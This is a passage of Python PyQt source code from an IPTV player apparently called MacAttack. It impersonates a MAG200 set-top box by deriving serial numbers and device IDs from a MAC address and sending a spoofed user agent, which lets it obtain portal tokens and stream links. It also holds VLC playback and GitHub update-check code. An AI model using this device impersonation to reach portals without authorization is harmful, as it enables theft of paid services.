                    url = self.base_url
                    mac = self.mac

                    # Check if token is still valid
                    if not self.is_token_valid():
                        self.token, self.token_random = get_token(session, url, mac)
                        self.token_timestamp = time.time()
                        if not self.token:
                            QMessageBox.critical(
                                self,
                                "Error",
                                "Failed to retrieve token. Please check your MAC address and URL.",
                            )
                            return

                    token = self.token

                    cmd_encoded = quote(cmd)
                    serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
                    sn = serialnumber[0:13]
                    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
                    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
                    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
                    cookies = {
                        "adid": hw_version_2,
                        "debug": "1",
                        "device_id2": device_id2,
                        "device_id": device_id,
                        "hw_version": "1.7-BD-00",
                        "mac": mac,
                        "sn": sn,
                        "stb_lang": "en",
                        "timezone": "America/Los_Angeles",
                        "token": token,
                    }

                    headers = {
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                        "AppleWebKit/533.3 (KHTML, like Gecko) "
                        "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                        "Authorization": f"Bearer {token}",
                        "Connection": "keep-alive",
                    }
                    create_link_url = f"{url}/{player_portaltype}?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                    logging.debug(f"Create link URL: {create_link_url}")
                    response = session.get(
                        create_link_url,
                        cookies=cookies,
                        headers=headers,
                        timeout=10,
                    )
                    response.raise_for_status()
                    json_response = response.json()
                    logging.debug(f"Create link response: {json_response}")
                    cmd_value = json_response.get("js", {}).get("cmd")
                    if cmd_value:
                        if cmd_value.startswith("ffmpeg "):
                            cmd_value = cmd_value[len("ffmpeg ") :]
                        stream_url = cmd_value
                        self.launch_media_player(stream_url)
                    else:
                        logging.error("Stream URL not found in the response.")
                        QMessageBox.critical(
                            self, "Error", "Stream URL not found in the response."
                        )
                except Exception as e:
                    logging.error(f"Error creating stream link: {e}")
                    QMessageBox.critical(
                        self, "Error", f"Error creating stream link: {e}"
                    )
            else:
                self.launch_media_player(cmd)

        elif item_type in ["episode", "vod"]:
            try:
                session = self.session
                url = self.base_url
                mac = self.mac

                # Check if token is still valid
                if not self.is_token_valid():
                    self.token, self.token_random = get_token(session, url, mac)
                    self.token_timestamp = time.time()
                    if not self.token:
                        QMessageBox.critical(
                            self,
                            "Error",
                            "Failed to retrieve token. Please check your MAC address and URL.",
                        )
                        return

                token = self.token

                cmd_encoded = quote(cmd)
                serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
                sn = serialnumber[0:13]
                device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
                device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
                hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
                cookies = {
                    "adid": hw_version_2,
                    "debug": "1",
                    "device_id2": device_id2,
                    "device_id": device_id,
                    "hw_version": "1.7-BD-00",
                    "mac": mac,
                    "sn": sn,
                    "stb_lang": "en",
                    "timezone": "America/Los_Angeles",
                    "token": token,
                }

                headers = {
                    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                    "AppleWebKit/533.3 (KHTML, like Gecko) "
                    "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                    "Authorization": f"Bearer {token}",
                    "Connection": "keep-alive",
                }
                if item_type == "episode":
                    episode_number = channel.get("episode_number")
                    if episode_number is None:
                        logging.error("Episode number is missing.")
                        QMessageBox.critical(
                            self, "Error", "Episode number is missing."
                        )
                        return
                    create_link_url = f"{url}/{player_portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&series={episode_number}&JsHttpRequest=1-xml"
                else:
                    create_link_url = f"{url}/{player_portaltype}?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                logging.debug(f"Create link URL: {create_link_url}")
                response = session.get(
                    create_link_url,
                    cookies=cookies,
                    headers=headers,
                    timeout=10,
                )
                response.raise_for_status()
                json_response = response.json()
                logging.debug(f"Create link response: {json_response}")
                cmd_value = json_response.get("js", {}).get("cmd")
                if cmd_value:
                    if cmd_value.startswith("ffmpeg "):
                        cmd_value = cmd_value[len("ffmpeg ") :]
                    stream_url = cmd_value
                    self.launch_media_player(stream_url)
                else:
                    logging.error("Stream URL not found in the response.")
                    QMessageBox.critical(
                        self, "Error", "Stream URL not found in the response."
                    )
            except Exception as e:
                logging.error(f"Error creating stream link: {e}")
                QMessageBox.critical(self, "Error", f"Error creating stream link: {e}")
        else:
            logging.error(f"Unknown item type: {item_type}")
            QMessageBox.critical(self, "Error", f"Unknown item type: {item_type}")

    def update_series_view(self, tab_name, scroll_position=0):
        tab_info = self.tab_data[tab_name]
        playlist_model = tab_info["playlist_model"]
        playlist_view = tab_info["playlist_view"]

        playlist_model.clear()

        if tab_info["navigation_stack"]:
            go_back_item = QStandardItem("Go Back")
            playlist_model.appendRow(go_back_item)

        for item in tab_info["current_series_info"]:
            item_type = item.get("item_type")
            if item_type == "season":
                name = f"Season {item['season_number']}"
            elif item_type == "episode":
                name = f"Episode {item['episode_number']}"
            else:
                name = item.get("name") or item.get("title")
            list_item = QStandardItem(name)
            list_item.setData(item, Qt.UserRole)
            list_item.setData(item_type, Qt.UserRole + 1)
            playlist_model.appendRow(list_item)

        # Restore scroll position after model is populated
        QTimer.singleShot(
            0, lambda: playlist_view.verticalScrollBar().setValue(scroll_position)
        )

    def launch_media_player(self, stream_url):
        self.video_url_label.setText(stream_url) #Put the video url in the label
        self.restart_vlc_instance()
        self.update_proxy()  # reset the vlc window with the proxy and referer
        self.error_label.setVisible(False)
        logging.debug(f"Launching media player with URL: {stream_url}")
        # If there is an existing worker thread, stop it first
        if self.video_worker is not None and self.video_worker.isRunning():
            self.video_worker.quit()  # Safely stop the worker
            if not self.video_worker.wait(3000):  # 3s timeout
                logging.debug("Warning: Worker thread did not stop in time.")
                if self.video_worker is not None and self.video_worker.isRunning():
                    logging.debug("Forcefully stopping the worker thread.")
                    self.video_worker.quit()
                    self.video_worker.terminate()  # Forcefully terminate
                    self.video_worker.wait()  # Wait for termination
        # Preload the media to minimize the delay when playing
        if self.videoPlayer.is_playing():
            self.videoPlayer.stop()
        self.videoPlayer.set_media(None)
        media = self.instance.media_new(stream_url)
        self.videoPlayer.set_media(media)
        # Start the worker thread to fetch stream URL in the background
        self.video_worker = VideoPlayerWorker(stream_url)
        self.video_worker.stream_url_ready.connect(self.on_stream_url_ready)
        self.video_worker.error_occurred.connect(self.on_error_occurred)
        # Start the thread (but don't play the video yet)
        self.video_worker.start()
        # Delay the actual video play call
        QTimer.singleShot(100, self.videoPlayer.play)

    def on_stream_url_ready(self, stream_url):
        logging.debug(f"Stream URL fetched: {stream_url}")
        self.videoPlayer.play()

    def on_error_occurred(self, error_message):
        logging.error(error_message)
        self.error_label.setText(error_message)
        self.error_label.setVisible(True)

    def modify_vlc_proxy(self, proxy_address):
        # Determine base_path based on whether the script is frozen or running as a script
        if getattr(sys, "frozen", False):
            base_path = sys._MEIPASS  # For frozen executables
        else:
            base_path = os.path.abspath(".")  # For scripts run directly
        # Construct the full file path using base_path
        file_path = os.path.join(
            base_path, "include", "vlcrc"
        )  # Use os.path.join for proper path construction
        # Read the file
        with open(file_path, "r") as file:
            lines = file.readlines()
        # Modify the http-proxy line
        for i, line in enumerate(lines):
            if "http-proxy=" in line:  # Check if the line contains 'http-proxy='
                if proxy_address:
                    # If the proxy_address is provided, update the line
                    lines[i] = f"http-proxy={proxy_address}\n"
                else:
                    # If no proxy_address is provided, reset it to the commented line
                    lines[i] = "#http-proxy=\n"
        # Write the modified content back to the file
        with open(file_path, "w") as file:
            file.writelines(lines)

    def mousePressEvent(self, event):  # Pause/play video
        # Begin resizing when clicking on the border
        if event.button() == Qt.LeftButton:
            # Get mouse position
            pos = event.pos()
            # Check if within the top 30 pixels but excluding the corners (left 20, right 20, top 20)
            if 0 < pos.x() < self.width() - 30 and 0 < pos.y() < 50:
                self.moving = True
                self.move_start_pos = event.globalPos()  # Global position for moving
            # Check if near the borders (left, right, bottom) for resizing
            elif (
                pos.x() < 40
                or pos.x() > self.width() - 40
                or pos.y() < 40
                or pos.y() > self.height() - 40
            ):
                self.resizing = True
                self.resize_start_pos = event.pos()
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:  # Only respond to left-clicks
                if not self.resizing and not self.moving:
                    if (
                        self.videoPlayer.is_playing()
                    ):  # Check if the video is currently playing
                        self.videoPlayer.pause()  # Pause the video
                    else:
                        self.videoPlayer.play()  # Play the video

    def mouseMoveEvent(self, event):
        if self.moving:
            # Move the window based on mouse movement
            delta = event.globalPos() - self.move_start_pos
            self.move(self.pos() + delta)
            self.move_start_pos = event.globalPos()
        elif self.resizing:
            # Resize the window based on mouse movement
            delta = event.pos() - self.resize_start_pos
            new_width = self.width() + delta.x()
            new_height = self.height() + delta.y()
            # Update window size while ensuring minimum size
            self.resize(max(new_width, 200), max(new_height, 200))
            # Update starting position for resizing
            self.resize_start_pos = event.pos()

    def mouseReleaseEvent(self, event):
        self.resizing = False
        self.moving = False

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            # fake mouse event to simulate a double-click
            fake_mouse_event = QMouseEvent(
                QEvent.MouseButtonDblClick,
                self.rect().center(),
                Qt.LeftButton,
                Qt.LeftButton,
                Qt.NoModifier,
            )
            self.mouseDoubleClickEvent(fake_mouse_event)
            event.accept()  # Stop further handling of Escape key
        elif event.key() == Qt.Key_Space:
            # Toggle play/pause
            if (
                self.videoPlayer.is_playing()
            ):  # Assuming isPlaying() checks if the video is currently playing
                self.videoPlayer.pause()
            else:
                self.videoPlayer.play()
            event.accept()  # Stop further handling of Space key
        else:
            super().keyPressEvent(event)  # Call base class method to handle other keys

    def mouseDoubleClickEvent(self, event):  # Fullscreen video
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:
                if self.windowState() == Qt.WindowNoState:
                    # Hide left_layout
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.hide()
                    self.left_widget.hide()
                    self.showFullScreen()
                    self.videoPlayer.play()  # Play the video because it paused on the click
                    self.tabs.tabBar().setVisible(False)  # Hide the tabs
                    self.topbar_layout.setContentsMargins(0, 0, 0, 0)
                    self.bottombar_layout.setContentsMargins(0, 0, 0, 0)
                    self.topbar_minimize_button.setVisible(False)
                    self.topbar_minimize_button.setEnabled(False)
                    self.topbar_close_button.setVisible(False)
                    self.topbar_close_button.setEnabled(False)
                else:
                    # Show left_layout
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.show()
                    self.left_widget.show()
                    self.showNormal()  # Restore to normal window state
                    self.videoPlayer.play()  # Play the video because it paused on the click
                    self.tabs.tabBar().setVisible(True)  # Hide the tabs
                    self.topbar_layout.setContentsMargins(30, 5, 0, 0)
                    self.bottombar_layout.setContentsMargins(0, 30, 0, 0)
                    self.topbar_minimize_button.setVisible(True)
                    self.topbar_minimize_button.setEnabled(True)
                    self.topbar_close_button.setVisible(True)
                    self.topbar_close_button.setEnabled(True)
                    self.error_label.setVisible(False)

    def on_tab_change(self, index):
        if self.startplay == 1:
            if index == 1:  # When Tab 1 is selected
                self.videoPlayer.play()  # Play the video
        if self.autopause_checkbox.isChecked():
            if index == 1:  # When Tab 1 is selected
                if (
                    not self.videoPlayer.is_playing()
                ):  # Check if the video is not already playing
                    self.videoPlayer.play()  # Play the video
            else:  # When any tab other than Tab 1 is selected
                if (
                    self.videoPlayer.is_playing()
                ):  # Check if the video is currently playing
                    self.videoPlayer.pause()  # Pause the video

    def killthreads(self):
        def join_threads():
            for thread in self.threads:
                thread.join()  # Wait for each thread to finish

        # Run the joining process in its own thread
        joiner_thread = threading.Thread(target=join_threads)
        joiner_thread.start()

    def show_update_popup(self, VERSION, latest_version, release_url):
        """Show the update popup in the main thread."""
        if latest_version:  # Only proceed if a new version is available
            msg = QMessageBox()
            msg.setIcon(QMessageBox.Information)
            msg.setWindowTitle(f"MacAttack v{VERSION} Update Available!")
            msg.setText(f"A new version v{latest_version} is available!")
            msg.setInformativeText(
                "Click the button below to view the release notes or download it:"
            )

            # Add buttons to the message box
            button = QPushButton(f"Update v{latest_version}")
            button.clicked.connect(lambda: webbrowser.open(release_url))
            cancel_button = QPushButton("Cancel")
            cancel_button.clicked.connect(msg.reject)

            msg.addButton(button, QMessageBox.AcceptRole)
            msg.addButton(cancel_button, QMessageBox.RejectRole)

            # Display the popup
            msg.exec_()

    def get_update(self):

        # GitHub API URL for latest release
        url = "https://api.github.com/repos/Evilvir-us/MacAttack/releases/latest"

        try:
            with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                # Fetch the latest release information
                response = requests.get(url)
                response.raise_for_status()  # Check for errors
                latest_release = response.json()

                # Get the latest version tag and release URL
                latest_version = latest_release["tag_name"]
                release_url = latest_release["html_url"]
                logging.info(f"Latest version on GitHub: {latest_version}")

                # Remove the 'v' prefix if it exists (to ensure proper comparison)
                if latest_version.startswith("v"):
                    latest_version = latest_version[1:]

                # Compare the versions
                if semver.compare(VERSION, latest_version) < 0:
                    logging.info(
                        f"Update available! Current version: {VERSION}, Latest version: {latest_version}"
                    )
                    self.show_update_popup(VERSION, latest_version, release_url)
                else:
                    logging.info(
                        f"You are up to date! Current version: {VERSION}, Latest version: {latest_version}"
                    )

        except requests.RequestException as e:
            logging.info(f"Error fetching update info: {e}")

    def closeEvent(self, event):
        self.videoPlayer.stop()
        self.SaveTheDay()
        # self.GiveUp()
        os._exit(0)
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MacAttack()
    window.show()
    sys.exit(app.exec_())
